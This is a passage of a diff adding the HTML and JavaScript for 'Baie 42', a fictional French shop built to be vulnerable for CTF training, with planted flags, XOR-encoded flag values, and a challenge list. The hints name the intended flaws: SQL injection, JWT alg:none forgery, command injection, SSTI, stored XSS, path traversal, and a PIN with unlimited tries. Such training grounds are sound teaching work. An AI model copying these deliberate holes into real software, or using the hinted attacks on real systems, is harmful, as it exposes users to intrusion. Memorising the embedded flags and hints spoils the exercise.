@@ -1,0 +1,1549 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Baie 42 — matériel réseau (CTF)</title>
+<meta name="author" content="equipe Baie 42 — note: CTF{b4l1s3_m3t4_cach33}">
+<meta name="generator" content="catalogue maison v2.1">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=IBM+Plex+Sans+Condensed:wght@500;700&family=IBM+Plex+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+<!-- Note interne, à supprimer avant la prod : CTF{c0mm3nt41r3s_b4v4rds} -->
+<!-- rappel equipe : le PIN du panneau direction n'a aucune limite d'essais, a corriger -->
+<style>
+:root{
+  --bg:#E9EEF2; --surface:#F7F9FB; --panel:#DCE3E9; --ink:#17283A; --muted:#566778;
+  --line:#B9C5D0; --steel:#33475C; --steel-2:#4A6077; --amber:#E39B12; --port:#2F6FB0;
+  --led:#3FA34D; --danger:#C2412D; --metal:#C9D2DA; --metal-2:#A9B5C0; --hole:#7D8B98;
+  color-scheme: light;
+}
+@media (prefers-color-scheme: dark){:root:not([data-theme="light"]){
+  --bg:#0E1923; --surface:#15222F; --panel:#1C2B3A; --ink:#E2E9F0; --muted:#93A4B5;
+  --line:#2C3E50; --steel:#8FA6BC; --steel-2:#6F879E; --amber:#F2AE2E; --port:#5B9BDB;
+  --led:#5CC46B; --danger:#E5664F; --metal:#2B3B4B; --metal-2:#3A4D60; --hole:#0B141C;
+  color-scheme: dark;}}
+:root[data-theme="dark"]{
+  --bg:#0E1923; --surface:#15222F; --panel:#1C2B3A; --ink:#E2E9F0; --muted:#93A4B5;
+  --line:#2C3E50; --steel:#8FA6BC; --steel-2:#6F879E; --amber:#F2AE2E; --port:#5B9BDB;
+  --led:#5CC46B; --danger:#E5664F; --metal:#2B3B4B; --metal-2:#3A4D60; --hole:#0B141C;
+  color-scheme: dark;}
+:root{box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+*,*::before,*::after{box-sizing:inherit}
+body{margin:0;background:var(--bg);color:var(--ink);font:400 16px/1.55 "IBM Plex Sans",system-ui,-apple-system,"Segoe UI",sans-serif}
+body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);z-index:10;background:var(--surface)}
+h1,h2,h3{font-family:"IBM Plex Sans Condensed","Arial Narrow",system-ui,sans-serif;font-weight:700;line-height:1.1;margin:0 0 .5em}
+h1{font-size:clamp(2.1rem,5vw,3.4rem);letter-spacing:-.01em}
+h2{font-size:1.8rem}
+h3{font-size:1.2rem}
+a{color:var(--port)}
+code,.mono{font-family:"IBM Plex Mono",ui-monospace,Menlo,Consolas,monospace;font-size:.92em}
+img,svg{max-width:100%}
+:focus-visible{outline:3px solid var(--amber);outline-offset:2px}
+
+header.top{position:sticky;top:env(safe-area-inset-top,0px);z-index:5;background:var(--surface);border-bottom:1px solid var(--line)}
+.bar{max-width:1180px;margin:0 auto;padding:.7rem 1.2rem;display:flex;align-items:center;gap:1rem;flex-wrap:wrap}
+.logo{display:flex;align-items:center;gap:.55rem;text-decoration:none;color:var(--ink);font:700 1.35rem "IBM Plex Sans Condensed",sans-serif}
+.logo svg{width:28px;height:28px}
+nav{display:flex;gap:.1rem;flex-wrap:wrap;margin-left:auto}
+nav a{text-decoration:none;color:var(--ink);padding:.4rem .65rem;border-radius:4px;font-weight:500}
+nav a:hover,nav a[aria-current="page"]{background:var(--panel)}
+.pill{display:inline-block;min-width:1.4em;padding:0 .35em;border-radius:99px;background:var(--amber);color:#1a1200;font-size:.78rem;font-weight:600;text-align:center;margin-left:.2rem}
+.themebtn{border:1px solid var(--line);background:var(--surface);color:var(--ink);border-radius:4px;width:2.1rem;height:2.1rem;cursor:pointer;font-size:1.1rem;line-height:1;display:grid;place-items:center}
+.themebtn:hover{background:var(--panel)}
+.progress{height:10px;background:var(--panel);border-radius:99px;overflow:hidden;margin:.8rem 0 0}
+.progress>i{display:block;height:100%;background:linear-gradient(90deg,var(--led),var(--amber));width:0;transition:width .4s}
+.win{background:linear-gradient(90deg,color-mix(in srgb,var(--led) 22%,var(--surface)),color-mix(in srgb,var(--amber) 22%,var(--surface)));border:1px solid var(--led);border-radius:6px;padding:1.2rem 1.4rem}
+#toast{position:fixed;left:50%;bottom:calc(1.2rem + env(safe-area-inset-bottom,0px));transform:translate(-50%,160%);z-index:20;background:var(--ink);color:var(--surface);padding:.7rem 1.1rem;border-radius:6px;font-weight:600;box-shadow:0 6px 24px rgba(0,0,0,.25);max-width:92vw;opacity:0;transition:transform .3s,opacity .3s}
+#toast.show{transform:translate(-50%,0);opacity:1}
+#toast.ok{border-left:4px solid var(--led)}
+#toast.err{border-left:4px solid var(--danger)}
+.timer{font-family:"IBM Plex Mono",monospace;font-weight:600}
+.badges{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:.6rem;margin-top:1rem}
+.badge{display:flex;gap:.6rem;align-items:center;background:var(--panel);border-radius:6px;padding:.6rem .7rem;opacity:.45;filter:grayscale(1)}
+.badge.on{opacity:1;filter:none;background:color-mix(in srgb,var(--led) 14%,var(--surface));border:1px solid color-mix(in srgb,var(--led) 45%,transparent)}
+.badge .ic{width:30px;height:30px;flex:0 0 30px;border-radius:50%;display:grid;place-items:center;background:var(--steel);color:var(--surface);font-weight:700}
+.badge.on .ic{background:var(--led)}
+.badge b{display:block;font-size:.92rem}.badge span{font-size:.78rem;color:var(--muted)}
+.sol{margin-top:.4rem;font-size:.9rem}
+.sol summary{cursor:pointer;color:var(--danger);font-weight:600}
+.sol[open] summary{color:var(--muted)}
+.sol p{margin:.5rem 0 0;color:var(--ink)}
+.sol-lock{margin:.4rem 0 0;font-size:.88rem;color:var(--muted);font-style:italic}
+.pipe{display:flex;gap:0;flex-wrap:wrap;margin:1rem 0;border:1px solid var(--line);border-radius:6px;overflow:hidden}
+.stage{flex:1;min-width:120px;padding:.9rem 1rem;background:var(--surface);border-right:1px solid var(--line);position:relative}
+.stage:last-child{border-right:0}
+.stage .st-name{font-weight:700;font-family:"IBM Plex Sans Condensed",sans-serif}
+.stage .st-state{font-size:.8rem;margin-top:.2rem;font-family:"IBM Plex Mono",monospace}
+.stage.ok{border-top:3px solid var(--led)} .stage.ok .st-state{color:var(--led)}
+.stage.warn{border-top:3px solid var(--amber)} .stage.warn .st-state{color:var(--amber)}
+.stage.fail{border-top:3px solid var(--danger)} .stage.fail .st-state{color:var(--danger)}
+.stage.run{border-top:3px solid var(--port)} .stage.run .st-state{color:var(--port)}
+.tabs{display:flex;gap:.3rem;flex-wrap:wrap;margin:1rem 0 .6rem}
+.tabs button{border:1px solid var(--line);background:var(--surface);color:var(--ink);border-radius:4px 4px 0 0;padding:.45rem .9rem;cursor:pointer;font:500 .95rem "IBM Plex Sans",sans-serif}
+.tabs button[aria-pressed="true"]{background:var(--steel);color:var(--surface);border-color:var(--steel)}
+.term{font-family:"IBM Plex Mono",monospace;font-size:.86rem;background:#0b141c;color:#cdd9e5;border-radius:6px;padding:1rem 1.1rem;overflow-x:auto;white-space:pre-wrap;word-break:break-word;line-height:1.5}
+.term .c-g{color:#5CC46B}.term .c-y{color:#F2AE2E}.term .c-r{color:#E5664F}.term .c-m{color:#93A4B5}
+
+main{max-width:1180px;margin:0 auto;padding:2rem 1.2rem 4rem}
+.hero{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1.05fr);gap:2.5rem;align-items:center}
+.hero p.lead{font-size:1.15rem;color:var(--muted);max-width:34em}
+.stats{display:flex;gap:2rem;margin-top:1.6rem;flex-wrap:wrap}
+.stats b{font:700 2rem "IBM Plex Sans Condensed",sans-serif;display:block;line-height:1}
+.stats span{color:var(--muted);font-size:.9rem}
+.rack-wrap{background:var(--surface);border:1px solid var(--line);border-radius:6px;padding:1rem}
+.rack a .unit-hit{fill:transparent;transition:fill .15s}
+.rack a:hover .unit-hit,.rack a:focus .unit-hit{fill:var(--amber);fill-opacity:.18}
+.rack-caption{font-size:.85rem;color:var(--muted);margin:.6rem 0 0}
+.btn{display:inline-flex;align-items:center;gap:.4rem;border:0;border-radius:4px;padding:.65rem 1.1rem;font:600 1rem "IBM Plex Sans",sans-serif;cursor:pointer;text-decoration:none;background:var(--steel);color:var(--surface)}
+.btn.amber{background:var(--amber);color:#1a1200}
+.btn.ghost{background:transparent;color:var(--ink);border:1px solid var(--line)}
+.btn:hover{filter:brightness(1.08)}
+.btn:disabled{opacity:.5;cursor:not-allowed;filter:none}
+.actions{display:flex;gap:.7rem;flex-wrap:wrap;margin-top:1.4rem}
+
+.filters{display:flex;gap:.4rem;flex-wrap:wrap;margin:1.2rem 0}
+.filters button{border:1px solid var(--line);background:var(--surface);color:var(--ink);border-radius:99px;padding:.4rem .9rem;cursor:pointer;font:500 .95rem "IBM Plex Sans",sans-serif}
+.filters button[aria-pressed="true"]{background:var(--steel);color:var(--surface);border-color:var(--steel)}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:1.2rem}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:6px;display:flex;flex-direction:column;overflow:hidden}
+.card .img{background:var(--panel);padding:1.5rem 1rem;display:grid;place-items:center;min-height:120px}
+.card .body{padding:1rem;display:flex;flex-direction:column;gap:.35rem;flex:1}
+.card .cat{font-size:.85rem;color:var(--muted)}
+.card .price{font-weight:600;font-size:1.15rem;margin-top:auto}
+.card a.title{color:var(--ink);text-decoration:none;font:700 1.12rem "IBM Plex Sans Condensed",sans-serif}
+.card a.title:hover{text-decoration:underline}
+.section-head{display:flex;justify-content:space-between;align-items:baseline;gap:1rem;flex-wrap:wrap;margin:2.6rem 0 1rem}
+.section-head p{margin:0;color:var(--muted)}
+
+.product{display:grid;grid-template-columns:minmax(0,1.2fr) minmax(0,1fr);gap:2rem}
+.product .img{background:var(--surface);border:1px solid var(--line);border-radius:6px;padding:2.3rem 1.5rem;display:grid;place-items:center}
+table{border-collapse:collapse;width:100%}
+.scroll{overflow-x:auto}
+td,th{padding:.5rem .6rem;border-bottom:1px solid var(--line);text-align:left;vertical-align:top}
+th{font-weight:600;color:var(--muted)}
+.specs th{width:42%}
+.box{background:var(--surface);border:1px solid var(--line);border-radius:6px;padding:1.2rem}
+.stack>*+*{margin-top:1rem}
+label{display:block;font-weight:500;margin-bottom:.25rem}
+input,textarea,select{width:100%;font:inherit;color:var(--ink);background:var(--bg);border:1px solid var(--line);border-radius:4px;padding:.55rem .65rem}
+textarea{min-height:90px;resize:vertical}
+input.qty{width:5.5rem}
+.row{display:flex;gap:.5rem;flex-wrap:wrap;align-items:flex-end}
+.notice{border-left:4px solid var(--amber);background:var(--panel);padding:.8rem 1rem;border-radius:0 4px 4px 0}
+.notice.err{border-color:var(--danger)}
+.notice.ok{border-color:var(--led)}
+.flag{font-family:"IBM Plex Mono",monospace;font-weight:600;background:var(--ink);color:var(--surface);padding:.15rem .45rem;border-radius:3px;word-break:break-all;user-select:all}
+.debug{font-family:"IBM Plex Mono",monospace;font-size:.85rem;color:var(--muted);background:var(--panel);padding:.6rem .8rem;border-radius:4px;overflow-x:auto;white-space:pre-wrap;word-break:break-all}
+.review{border-top:1px solid var(--line);padding-top:.7rem}
+.review .who{font-weight:600}
+pre.robots{font-family:"IBM Plex Mono",monospace;background:var(--surface);border:1px solid var(--line);padding:1.2rem;border-radius:6px;overflow-x:auto;white-space:pre-wrap;word-break:break-word}
+
+.chal{display:grid;grid-template-columns:auto 1fr auto;gap:.3rem 1rem;align-items:start;padding:.9rem 0;border-bottom:1px solid var(--line)}
+.chal .led{width:12px;height:12px;border-radius:50%;background:var(--metal-2);margin-top:.45rem}
+.chal.done .led{background:var(--led);box-shadow:0 0 0 3px color-mix(in srgb,var(--led) 30%,transparent)}
+.chal .pts{font-weight:600;color:var(--muted);white-space:nowrap}
+.chal .hint{grid-column:2/4;font-size:.92rem;color:var(--muted)}
+.diff{font-size:.72rem;font-weight:600;border-radius:3px;padding:.05rem .4rem;vertical-align:middle;margin-left:.4rem}
+.d1{background:color-mix(in srgb,var(--led) 25%,transparent);color:var(--ink)}
+.d2{background:color-mix(in srgb,var(--port) 28%,transparent);color:var(--ink)}
+.d3{background:color-mix(in srgb,var(--amber) 35%,transparent);color:var(--ink)}
+.d4{background:color-mix(in srgb,var(--danger) 30%,transparent);color:var(--ink)}
+/* palette validee par l'equipe design le 2026-09 — ticket interne CTF{c0mm3nt41r3_css} */
+.wow{color:var(--surface);background:var(--surface);user-select:all}
+.score{font:700 3rem "IBM Plex Sans Condensed",sans-serif;line-height:1}
+.catgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:.6rem;margin-top:1rem}
+.catgrid .c{background:var(--panel);border-radius:4px;padding:.6rem .8rem;font-size:.9rem}
+.catgrid .c b{display:block;font-size:1.3rem;font-family:"IBM Plex Sans Condensed",sans-serif}
+footer{border-top:1px solid var(--line);color:var(--muted);font-size:.88rem}
+footer .bar{justify-content:space-between}
+
+@media (max-width:820px){.hero,.product{grid-template-columns:1fr}.hero .rack-wrap{order:-1}}
+@media (prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+</head>
+<body>
+<header class="top">
+  <div class="bar">
+    <a class="logo" href="#accueil" aria-label="Baie 42, accueil">
+      <svg viewBox="0 0 28 28" aria-hidden="true"><rect x="3" y="2" width="22" height="24" rx="2" fill="var(--steel)"/><rect x="6" y="6" width="16" height="4" fill="var(--panel)"/><rect x="6" y="12" width="16" height="4" fill="var(--panel)"/><rect x="6" y="18" width="16" height="4" fill="var(--panel)"/><circle cx="19.5" cy="8" r="1.2" fill="var(--amber)"/><circle cx="19.5" cy="14" r="1.2" fill="var(--led)"/></svg>
+      Baie 42
+    </a>
+    <nav id="nav">
+      <a href="#boutique">Boutique</a>
+      <a href="#support">Support</a>
+      <a href="#pipeline">CI/CD</a>
+      <a href="#soc">SOC</a>
+      <a href="#edr">EDR</a>
+      <a href="#reverse">Reverse</a>
+      <a href="#capture">Réseau</a>
+      <a href="#timeline">Timeline</a>
+      <a href="#crypto">Crypto</a>
+      <a href="#forensic">Forensic</a>
+      <a href="#phishing">Phishing</a>
+      <a href="#mitre">ATT&CK</a>
+      <a href="#certificat">Certificat</a>
+      <a href="#panier">Panier <span class="pill" id="cartCount">0</span></a>
+      <a href="#connexion" id="navLogin">Connexion</a>
+      <a href="#flags">Flags <span class="pill" id="flagCount">0/78</span></a>
+      <button id="themeToggle" class="themebtn" type="button" aria-label="Changer de theme" title="Theme clair / sombre">◐</button>
+    </nav>
+  </div>
+</header>
+
+<main id="app" tabindex="-1"></main>
+
+<footer>
+  <div class="bar">
+    <span>Baie 42 est une boutique fictive, vulnérable volontairement. Terrain d’entraînement CTF.</span>
+    <nav aria-label="Liens de bas de page" style="display:flex;gap:.9rem;flex-wrap:wrap">
+      <a href="#faq">FAQ</a><a href="#cgv">Mentions légales</a><a href="#sitemap">Plan du site</a><a href="#reseau">Réseau</a><a href="#promos">Promos</a><a href="#profil">Mon profil</a>
+    </nav>
+    <span>Catalogue v2.1 · build 2026-11</span>
+  </div>
+</footer>
+
+<script>
+/* ============================================================
+   Baie 42 — boutique CTF (v2)
+   TODO equipe : retirer le compte de test guest / guest avant la prod
+   TODO equipe : la verif du role admin se fait cote client, a corriger
+   TODO equipe : /api/sauvegarde ne demande aucune authentification
+   ============================================================ */
+(function(){
+"use strict";
+
+function sGet(k,def){try{const v=localStorage.getItem(k);return v===null?def:v}catch(e){return def}}
+function sSet(k,v){try{localStorage.setItem(k,v)}catch(e){}}
+function sDel(k){try{localStorage.removeItem(k)}catch(e){}}
+
+/* flags encodes (XOR) */
+const _F={"f1":[105,127,106,86,77,31,93,71,24,66,89,26,30,66,25,88,115,79,26,89,4,88,79,95,80],"f2":[105,127,106,86,92,31,82,26,95,95,114,64,28,111,73,31,79,69,29,112,66,27,24,66,80],"f3":[105,127,106,86,31,75,0,88,116,92,95,30,75,69,27,95,115,75,26,65,68,26,70,31,80],"f4":[105,127,106,86,95,90,4,68,95,29,89,29,112,94,25,76,24,89,31,89,3,87],"f5":[105,127,106,86,93,94,92,67,116,78,84,94,27,67,89,116,24,88,90,71,77],"f6":[105,127,106,86,77,31,0,65,26,31,114,92,31,92,25,116,24,73,67,30,94,87],"f7":[105,127,106,86,76,27,67,25,29,24,114,64,28,67,94,116,92,25,93,112,84,95,116,79,69,31,73,86,88,24,65,30,64,91,77],"f8":[105,127,106,86,86,92,67,117,79,24,67,93,112,92,25,88,115,25,88,30,67,87],"f9":[105,127,106,86,77,31,93,71,31,66,73,29,112,84,25,116,64,25,113,75,1,88,24,79,89,31,31,94,87],"f10":[105,127,106,86,92,31,68,27,24,115,78,30,75,3,117,91,94,29,67,31,77],"f11":[105,127,106,86,77,90,93,95,71,115,73,29,112,66,25,70,29,94,29,92,77],"f12":[105,127,106,86,31,65,90,25,72,88,28,30,65,111,78,24,115,78,30,66,93,30,69,72,30,93,82],"f13":[105,127,106,86,90,93,4,92,24,94,94,29,28,111,78,24,115,78,70,28,93,27,69,81],"f14":[105,127,106,86,93,92,68,27,116,70,28,64,69,4,117,72,28,67,72,30,87,87],"f15":[105,127,106,86,67,75,5,117,69,31,94,90,112,64,70,94,95,114,93,28,83,95,89,29,94,29,82],"f16":[105,127,106,86,68,28,68,26,69,115,93,92,28,84,27,72,88,28,76,67,3,87],"f17":[105,127,106,86,68,88,68,117,31,64,74,113,65,0,68,24,81],"f18":[105,127,106,86,77,28,67,30,89,115,25,113,67,4,117,89,28,64,26,30,94,25,86],"f19":[105,127,106,86,77,31,94,89,27,64,30,113,75,3,92,24,64,29,94,95,3,95,89,81],"f20":[105,127,106,86,94,30,94,117,88,24,67,93,112,92,27,70,29,89,29,82],"pin":[29,24,29,20],"jd":[89,68,64,72,71,67],
+"g1":[105,127,106,86,88,30,3,93,116,95,29,91,93,83,25,116,68,89,67,67,77],"g2":[105,127,106,86,77,31,93,71,24,66,89,26,30,66,25,116,79,94,93,82],"g3":[105,127,106,86,79,67,68,117,79,31,114,66,30,93,30,76,31,80],"g4":[105,127,106,86,26,91,68,88,26,78,88,90,112,84,30,95,24,80],"g5":[105,127,106,86,90,28,72,94,24,115,79,66,27,94,73,116,95,88,92,112,82,70,31,66,78,83],"g6":[105,127,106,86,76,27,92,27,88,31,114,67,28,68,30,116,79,76,77,71,3,25,86],"g7":[105,127,106,86,66,31,83,30,71,95,89,30,93,4,77,24,115,29,91,89,3,88,95,81],"g8":[105,127,106,86,76,27,67,25,29,24,114,74,27,94,89,116,64,30,93,112,83,77,93,81],"g9":[105,127,106,86,72,67,4,77,116,24,114,66,28,94,92,24,94,94,83],"g10":[105,127,106,86,70,28,72,30,79,31,78,31,66,4,70,116,74,25,77,30,92,25,86],"g11":[105,127,106,86,76,30,94,30,26,94,30,113,73,4,73,26,64,30,83],"g12":[105,127,106,86,99,31,98,121,24,115,121,31,123,1,117,127,28,121,30,82],"g13":[105,127,106,86,93,30,68,25,70,24,93,113,87,93,70,116,64,28,93,91,3,87],"g14":[105,127,106,86,31,65,86,26,73,89,65,66,28,111,94,26,88,65,29,82],"g15":[105,127,106,86,94,27,87,25,116,73,95,92,28,69,88,116,24,29,26,82],"g16":[105,127,106,86,77,71,4,71,91,115,78,79,76,88,25,116,74,29,92,66,77],"g17":[105,127,106,86,72,27,65,117,88,92,29,31,67,3,88,116,28,88,88,28,66,94,86],"g18":[105,127,106,86,26,91,82,30,88,68,114,67,30,66,26,26,94,80],"g19":[105,127,106,86,29,65,68,25,95,31,114,70,91,68,90,116,72,30,76,90,87,87],"g20":[105,127,106,86,67,28,94,94,26,28,67,93,112,92,25,76,24,65,29,92,77],
+"ci1":[105,127,106,86,93,28,83,88,24,88,114,77,31,84,25,116,31,67,113,75,69,88,116,79,28,83],"ci2":[105,127,106,86,75,65,70,117,24,84,93,30,92,3,117,79,24,67,93,112,92,30,89,88,30,72,27,83,94,86],"ci3":[105,127,106,86,74,31,68,117,76,29,89,113,28,72,90,27,95,30,83],"ci4":[105,127,106,86,74,31,83,65,24,94,75,31,67,3,117,73,24,91,26,93,84,87],"ci5":[105,127,106,86,74,28,64,25,69,72,25,64,76,3,117,93,89,65,64,28,66,30,73,64,30,83],"ci6":[105,127,106,86,90,31,91,25,69,115,73,26,65,67,117,71,31,94,113,67,0,77,88,81],"ci7":[105,127,106,86,94,30,64,25,71,29,67,29,112,67,30,69,95,114,77,31,94,94,89,28,65,29,82],
+"a1":[105,127,106,86,94,93,1,82,116,66,30,73,31,83,27,24,115,78,30,91,3,117,72,64,28,29,65,68,87],"a2":[105,127,106,86,31,75,0,88,116,79,29,67,66,4,68,79,31,114,74,27,69,94,89,89,28,83],"a3":[105,127,106,86,76,31,94,117,72,24,73,29,27,69,117,88,31,92,91,28,94,94,26,31,65,83],"a4":[105,127,106,86,67,27,67,89,116,24,94,93,30,87,68,116,79,95,29,75,1,94,86],"b1":[105,127,106,86,76,27,83,65,27,74,75,31,76,3,117,88,24,67,93,112,4,95,95,68,80],"b2":[105,127,106,86,72,90,1,94,24,115,73,30,65,94,25,24,95,114,77,67,1,25,69,88,94,83],"b3":[105,127,106,86,93,28,83,88,24,88,114,74,27,94,89,116,64,30,93,112,64,30,89,24,64,83],"b4":[105,127,106,86,26,95,1,117,94,95,30,92,92,111,68,27,66,114,94,93,0,94,24,75,30,29,82],
+"w1":[105,127,106,86,77,92,66,76,116,92,95,30,66,0,94,26,28,67,113,27,84,71,26,66,80],"w2":[105,127,106,86,93,92,66,76,116,65,30,90,27,84,26,69,66,30,29,92,111,73,71,28,88,74,82],"w3":[105,127,106,86,92,28,84,27,89,31,78,90,30,0,68,116,28,88,88,28,66,94,24,81],"w4":[105,127,106,86,91,95,92,26,31,72,114,64,31,94,117,89,31,94,90,93,3,27,69,88,80],"w5":[105,127,106,86,66,31,87,27,69,115,94,26,65,67,117,71,29,64,31,91,3,117,73,94,25,64,76,88,25,86],
+"soc1":[105,127,106,86,90,93,1,30,76,31,114,88,93,4,27,116,92,29,93,30,68,27,77,81],"soc2":[105,127,106,86,77,31,66,88,24,64,25,90,30,0,68,116,29,93,113,27,68,94,31,93,88,26,65,68,87],"soc3":[105,127,106,86,31,31,83,117,79,28,64,26,30,94,25,116,65,25,66,89,3,27,71,64,25,64,91,77],"edr1":[105,127,106,86,94,93,0,73,24,95,94,91,92,111,71,31,64,91,29,30,92,70,31,66,89,83],"edr2":[105,127,106,86,94,28,66,89,26,95,89,26,65,83,25,116,72,30,90,28,83,94,24,31,80],"edr3":[105,127,106,86,70,31,68,25,116,29,94,30,67,3,117,90,89,25,92,27,94,94,31,29,67,29,82],
+"rev1":[105,127,106,86,77,71,4,27,69,31,114,74,28,0,72,77,89,94,95,90,3,25,86],"rev2":[105,127,106,86,77,93,4,73,64,65,30,113,87,0,88,116,94,30,88,28,66,89,24,81],"net1":[105,127,106,86,77,93,3,78,88,115,30,64,112,83,70,31,29,95,113,71,68,94,91,81],"net2":[105,127,106,86,29,87,86,27,71,88,95,26,91,1,26,69,115,73,64,92,77],"net3":[105,127,106,86,76,28,4,73,27,66,114,77,29,111,78,24,88,30,77,91,3,87],"tl1":[105,127,106,86,90,30,93,25,71,29,67,29,112,66,25,72,28,67,93,91,1,94,94,31,30,83],
+"cry1":[105,127,106,86,88,30,87,25,69,31,95,29,112,83,70,24,115,95,29,95,3,94,24,31,80],"cry2":[105,127,106,86,86,31,66,117,72,64,30,113,76,0,95,89,88,30,113,76,4,89,88,31,30,83],"cry3":[105,127,106,86,92,92,81,117,70,28,73,91,67,3,117,77,24,28,76,67,3,87],"for1":[105,127,106,86,92,28,87,27,88,88,95,29,112,66,95,69,115,70,29,86,77],"for2":[105,127,106,86,75,89,3,68,95,64,29,73,112,4,28,25,24,114,93,90,67,90,24,79,89,83],"phi1":[105,127,106,86,94,71,1,89,67,29,67,73,112,67,90,77,115,73,69,30,93,117,77,24,28,66,82]};
+function F(k){return _F[k].map((c,i)=>String.fromCharCode(c^(0x2A+i%7))).join("")}
+
+const CHALLENGES=[
+  {id:"f1", name:"Code source bavard", pts:50, cat:"Web", diff:1, hint:"Les developpeurs laissent parfois des notes la ou le visiteur ne regarde pas : le code source de la page."},
+  {id:"f2", name:"Les robots savent tout", pts:75, cat:"Web", diff:1, hint:"Un fichier bien connu dit aux moteurs quoi ne pas indexer. Ouvre la vue #robots, elle y pointe un repertoire."},
+  {id:"f19",name:"Message dans la console", pts:50, cat:"Web", diff:1, hint:"Ouvre la console developpeur de ton navigateur (F12) : l'equipe y a oublie un message au chargement."},
+  {id:"f3", name:"Produit fantome", pts:100, cat:"IDOR", diff:2, hint:"Le catalogue compte plus de references qu'il n'en affiche. Regarde comment les fiches sont adressees (#produit-7) et essaie d'autres numeros."},
+  {id:"f4", name:"Remise imprevue", pts:100, cat:"Logique metier", diff:2, hint:"Le panier fait confiance aux quantites saisies. Une quantite negative, et la commande te rapporte de l'argent."},
+  {id:"f11",name:"Cumul de remises", pts:125, cat:"Logique metier", diff:2, hint:"Le code promo du panier ne verifie pas s'il a deja ete applique. Entre le meme plusieurs fois."},
+  {id:"f10",name:"Code promo tourne", pts:100, cat:"Crypto", diff:2, hint:"La biblio promo affiche un code chiffre par decalage (ROT13). Decale-le de 13 lettres pour lire le vrai code."},
+  {id:"f18",name:"Cesar a la romaine", pts:100, cat:"Crypto", diff:2, hint:"Le bon de livraison contient un message en chiffre de Cesar, decale de 7. Le flag apparait une fois dechiffre."},
+  {id:"f7", name:"Licence en clair", pts:100, cat:"Encodage", diff:2, hint:"Une fiche technique contient une cle de licence en base64. Encodage n'est pas chiffrement : decode-la."},
+  {id:"f5", name:"Auth contournee (SQLi)", pts:150, cat:"Injection SQL", diff:3, hint:"La page de connexion affiche la requete construite. Les guillemets ne sont pas echappes : rends la condition toujours vraie."},
+  {id:"f6", name:"Promotion express", pts:150, cat:"Session", diff:3, hint:"Ta session est un objet encode en base64 dans le navigateur. Change role:client en role:admin, puis va sur #admin."},
+  {id:"f17",name:"Jeton alg:none", pts:175, cat:"Session", diff:4, hint:"Le support utilise un JWT. Son en-tete accepte alg:none : forge un jeton role:admin sans signature pour #support-admin."},
+  {id:"f16",name:"Jeton previsible", pts:150, cat:"Session", diff:3, hint:"Le jeton de reinitialisation n'est que base64(login:AAAA-MM). Forge celui de l'admin pour la periode courante."},
+  {id:"f15",name:"Empreinte faible", pts:150, cat:"Crypto", diff:3, hint:"Le fichier de sauvegarde donne une empreinte MD5. MD5 se casse par dictionnaire : retrouve le mot de passe 'jardin'."},
+  {id:"f13",name:"Traversee de chemin", pts:150, cat:"Web", diff:3, hint:"Le telechargement de facture prend un nom de fichier en parametre. Remonte l'arborescence avec ../ pour lire un fichier systeme."},
+  {id:"f12",name:"Injection de commandes", pts:175, cat:"Injection", diff:4, hint:"L'outil ping du support passe l'hote a un shell. Enchaine une commande avec ; ou && apres l'adresse."},
+  {id:"f14",name:"Gabarit injecte (SSTI)", pts:200, cat:"Injection", diff:4, hint:"L'apercu d'email du support evalue les {{ }}. Essaie {{7*7}}, puis demande la config de l'application."},
+  {id:"f8", name:"Avis piege (XSS)", pts:125, cat:"XSS", diff:3, hint:"Le formulaire d'avis n'applique aucun filtre. Un <img onerror> ou un <script> s'executerait chez chaque visiteur."},
+  {id:"f20",name:"PIN sans limite", pts:125, cat:"Force brute", diff:3, hint:"Le panneau direction demande un PIN a 4 chiffres, sans limite d'essais. 10000 combinaisons, un script en vient a bout."},
+  {id:"f9", name:"Commande de la direction", pts:200, cat:"Chaine", diff:4, hint:"Le tableau de bord direction (apres le PIN) n'est visible que si tu es admin. Cumule l'escalade de role et le PIN."},
+  // --- 20 defis debutants ---
+  {id:"g1", name:"Voir le code source", pts:25, cat:"Debutant", diff:1, hint:"Clic droit > Afficher le code source de la page. Un commentaire HTML en haut du document contient un flag."},
+  {id:"g2", name:"Commentaire CSS", pts:25, cat:"Debutant", diff:1, hint:"Les feuilles de style aussi portent des commentaires. Cherche dans la balise <style> du code source."},
+  {id:"g6", name:"Balise meta oubliee", pts:30, cat:"Debutant", diff:1, hint:"Les balises <meta> de l'en-tete ne s'affichent pas a l'ecran. Regarde <meta name=\"author\"> dans le source."},
+  {id:"g3", name:"Texte alternatif", pts:30, cat:"Debutant", diff:1, hint:"Inspecte l'element de l'accueil : une image porte un texte alternatif (aria-label) qui cache un flag."},
+  {id:"g4", name:"Attribut data", pts:30, cat:"Debutant", diff:1, hint:"Inspecte le bouton \"Voir le catalogue\" de l'accueil : un attribut data-* y a ete laisse."},
+  {id:"g14",name:"Infobulle", pts:30, cat:"Debutant", diff:1, hint:"Sur l'accueil, survole le mot souligne \"baie\" du titre : son attribut title (infobulle) revele un flag."},
+  {id:"g7", name:"Stockage local ouvert", pts:35, cat:"Debutant", diff:1, hint:"Outils de dev > Application > Local Storage. Une cle 'baie42_memo' contient un flag en clair."},
+  {id:"g16",name:"Champ cache", pts:35, cat:"Debutant", diff:1, hint:"Inspecte le formulaire de connexion : un champ input de type hidden porte un flag."},
+  {id:"g15",name:"Page d'erreur", pts:30, cat:"Debutant", diff:1, hint:"Visite une adresse qui n'existe pas (ex. #nawak). La page d'erreur 404 affiche un flag."},
+  {id:"g5", name:"Blanc sur blanc", pts:35, cat:"Debutant", diff:1, hint:"Page Mentions legales (#cgv) : un passage est ecrit en blanc sur blanc. Selectionne tout le texte pour le reveler."},
